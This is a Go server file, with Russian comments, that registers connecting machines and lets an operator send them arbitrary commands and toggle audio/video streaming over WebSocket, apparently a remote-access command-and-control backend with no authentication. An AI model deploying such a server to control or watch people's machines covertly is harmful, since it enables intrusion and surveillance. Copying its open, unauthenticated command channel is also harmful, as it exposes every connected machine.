package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/gin-gonic/gin"
	"github.com/gorilla/websocket"
)

// ClientConnection представляет соединение с клиентом
type ClientConnection struct {
	ID        string
	Conn      *websocket.Conn
	Hostname  string
	OS        string
	IP        string
	LastSeen  time.Time
	IsStreaming bool
	mu        sync.Mutex
}

// CommandRequest содержит команду для отправки клиенту
type CommandRequest struct {
	ClientID string `json:"client_id"`
	Command  string `json:"command"`
	Args     string `json:"args"`
}

// CommandResponse содержит ответ от клиента
type CommandResponse struct {
	ClientID string `json:"client_id"`
	Output   string `json:"output"`
	Error    string `json:"error"`
	Status   int    `json:"status"`
}

// StreamRequest запрос на начало или остановку стриминга
type StreamRequest struct {
	ClientID string `json:"client_id"`
	Start    bool   `json:"start"`
}

var (
	clients     = make(map[string]*ClientConnection)
	clientsMux  sync.RWMutex
	upgrader    = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool {
			return true // Разрешаем все подключения для тестирования
		},
	}
)

func main() {
	r := gin.Default()

	// Маршруты для админ-панели
	r.GET("/api/clients", getClients)
	r.POST("/api/command", sendCommand)
	r.POST("/api/stream", toggleStream)
	
	// Маршрут для подключения клиентов
	r.GET("/connect", handleClientConnection)
	
	// Маршрут для получения стрима от клиентов
	r.GET("/stream/:client_id", handleClientStream)
	
	// Маршрут для админ-панели
	r.GET("/admin", handleAdminConnection)

	log.Println("Сервер запущен на порту 8080")
	if err := r.Run(":8080"); err != nil {
		log.Fatal("Ошибка запуска сервера:", err)
	}
}

// Обрабатывает подключение клиента через WebSocket
func handleClientConnection(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("Ошибка при создании WebSocket:", err)
		return
	}

	// Получаем информацию о клиенте
	var clientInfo struct {
		Hostname string `json:"hostname"`
		OS       string `json:"os"`
		IP       string `json:"ip"`
	}
	
	if err := conn.ReadJSON(&clientInfo); err != nil {
		log.Println("Ошибка при чтении информации о клиенте:", err)
		conn.Close()
		return
	}

	clientID := fmt.Sprintf("%s-%d", clientInfo.Hostname, time.Now().UnixNano())
	client := &ClientConnection{
		ID:        clientID,
		Conn:      conn,
		Hostname:  clientInfo.Hostname,
		OS:        clientInfo.OS,
		IP:        clientInfo.IP,
		LastSeen:  time.Now(),
		IsStreaming: false,
	}

	clientsMux.Lock()
	clients[clientID] = client
	clientsMux.Unlock()

	log.Printf("Новый клиент подключен: %s (%s)", clientInfo.Hostname, clientInfo.IP)

	// Обработка сообщений от клиента
	go handleClientMessages(client)
}

// Обрабатывает сообщения от клиента
func handleClientMessages(client *ClientConnection) {
	defer func() {
		client.Conn.Close()
		clientsMux.Lock()
		delete(clients, client.ID)
		clientsMux.Unlock()
		log.Printf("Клиент отключен: %s", client.Hostname)
	}()

	for {
		_, message, err := client.Conn.ReadMessage()
		if err != nil {
			log.Printf("Ошибка чтения: %v", err)
			break
		}

		var response map[string]interface{}
		if err := json.Unmarshal(message, &response); err != nil {
			log.Printf("Ошибка декодирования JSON: %v", err)
			continue
		}

		// Обновляем время последней активности
		client.mu.Lock()
		client.LastSeen = time.Now()
		client.mu.Unlock()

		log.Printf("Получено сообщение от клиента %s: %s", client.Hostname, string(message))
	}
}

// Обрабатывает WebSocket соединения от админ-панели
func handleAdminConnection(c *gin.Context) {
	conn, err := upgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		log.Println("Ошибка при создании WebSocket для админа:", err)
		return
	}
	defer conn.Close()

	// Отправляем список клиентов при подключении
	sendClientList(conn)

	for {
		_, message, err := conn.ReadMessage()
		if err != nil {
			log.Println("Ошибка чтения от админа:", err)
			break
		}

		// Обработка команд от админ-панели
		var cmd CommandRequest
		if err := json.Unmarshal(message, &cmd); err != nil {
			log.Printf("Ошибка декодирования команды: %v", err)
			continue
		}

		// Находим клиента и отправляем ему команду
		clientsMux.RLock()
		client, exists := clients[cmd.ClientID]
		clientsMux.RUnlock()

		if !exists {
			if err := conn.WriteJSON(CommandResponse{
				ClientID: cmd.ClientID,
				Error:    "Клиент не найден",
				Status:   404,
			}); err != nil {
				log.Printf("Ошибка отправки ответа: %v", err)
			}
			continue
		}

		// Отправляем команду клиенту
		client.mu.Lock()
		if err := client.Conn.WriteJSON(map[string]string{
			"command": cmd.Command,
			"args":    cmd.Args,
		}); err != nil {
			log.Printf("Ошибка отправки команды клиенту: %v", err)
			client.mu.Unlock()
			continue
		}
		client.mu.Unlock()

		// Здесь мы должны получить ответ от клиента и перенаправить его админу
		// В реальном приложении нужно будет настроить систему уведомлений/ответов
	}
}

// Отправляет список клиентов через WebSocket
func sendClientList(conn *websocket.Conn) {
	clientsMux.RLock()
	clientList := make([]map[string]interface{}, 0, len(clients))
	for _, client := range clients {
		clientList = append(clientList, map[string]interface{}{
			"id":       client.ID,
			"hostname": client.Hostname,
			"os":       client.OS,
			"ip":       client.IP,
			"lastSeen": client.LastSeen,
			"isStreaming": client.IsStreaming,
		})
	}
	clientsMux.RUnlock()

	if err := conn.WriteJSON(map[string]interface{}{
		"type":    "clientList",
		"clients": clientList,
	}); err != nil {
		log.Printf("Ошибка отправки списка клиентов: %v", err)
	}
}

// API для получения списка клиентов
func getClients(c *gin.Context) {
	clientsMux.RLock()
	clientList := make([]map[string]interface{}, 0, len(clients))
	for _, client := range clients {
		clientList = append(clientList, map[string]interface{}{
			"id":       client.ID,
			"hostname": client.Hostname,
			"os":       client.OS,
			"ip":       client.IP,
			"lastSeen": client.LastSeen.Format(time.RFC3339),
			"isStreaming": client.IsStreaming,
		})
	}
	clientsMux.RUnlock()

	c.JSON(http.StatusOK, map[string]interface{}{
		"clients": clientList,
	})
}

// API для отправки команды клиенту
func sendCommand(c *gin.Context) {
	var cmd CommandRequest
	if err := c.ShouldBindJSON(&cmd); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Некорректный запрос"})
		return
	}

	clientsMux.RLock()
	client, exists := clients[cmd.ClientID]
	clientsMux.RUnlock()

	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Клиент не найден"})
		return
	}

	// Отправляем команду клиенту
	client.mu.Lock()
	err := client.Conn.WriteJSON(map[string]string{
		"command": cmd.Command,
		"args":    cmd.Args,
	})
	client.mu.Unlock()

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Ошибка отправки команды: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "Команда отправлена"})
}

// API для управления стримингом
func toggleStream(c *gin.Context) {
	var req StreamRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Некорректный запрос"})
		return
	}

	clientsMux.RLock()
	client, exists := clients[req.ClientID]
	clientsMux.RUnlock()

	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Клиент не найден"})
		return
	}

	client.mu.Lock()
	client.IsStreaming = req.Start
	err := client.Conn.WriteJSON(map[string]interface{}{
		"command": "stream",
		"start":   req.Start,
	})
	client.mu.Unlock()

	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Ошибка отправки команды: " + err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{"status": "Команда стриминга отправлена", "streaming": req.Start})
}

// Обрабатывает стрим от клиента
func handleClientStream(c *gin.Context) {
	clientID := c.Param("client_id")
	
	clientsMux.RLock()
	client, exists := clients[clientID]
	clientsMux.RUnlock()
	
	if !exists {
		c.JSON(http.StatusNotFound, gin.H{"error": "Клиент не найден"})
		return
	}
	
	// В реальном приложении здесь нужна будет настройка стриминг-протокола
	// Например, WebRTC или другой метод передачи видео и аудио
	c.String(http.StatusOK, "Streaming endpoint for client "+clientID)
} 